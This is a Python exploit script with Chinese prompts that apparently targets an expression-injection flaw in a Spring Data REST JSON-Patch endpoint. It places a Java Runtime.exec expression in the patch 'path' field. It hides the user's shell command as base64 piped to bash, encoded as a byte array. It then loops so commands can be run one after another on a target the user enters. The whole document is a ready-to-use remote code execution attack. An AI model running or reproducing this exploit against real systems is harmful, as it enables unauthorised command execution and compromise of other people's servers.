import requests
import base64
import colorama

def attack(ip,cmd):
    url = 'http://{}/customers/1'.format(ip)
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/json-patch+json'
    }
    cmd = convert_payload(cmd)
    payload = [
        {
            "op": "replace",
            "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{" + cmd + "}))/lastname",
            "value": "exploit"
        }
    ]
    try:
        response = requests.patch(url, json=payload, headers=headers)
        print(colorama.Fore.GREEN + "[info] 利用成功 ")
    except Exception as e:
        print(colorama.Fore.RED + "[error] 发生错误：{}".format(e))


def convert_payload(cmd):
    cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    print(",".join(map(str, (
        map(ord, "bash -c {echo,"+ cmd +"}|{base64,-d}|{bash,-i}")))))
    return ",".join(map(str, (
        map(ord, "bash -c {echo,"+ cmd +"}|{base64,-d}|{bash,-i}"))))

if __name__ == '__main__':
    target = input("请输入你的target: ")
    cmd = input("请输入你要执行的cmd: ")
    while True:
        print(colorama.Fore.GREEN + "[info] 开始利用")
        attack(target, cmd)
        cmd = input("请输入你要执行的下一个cmd: ")


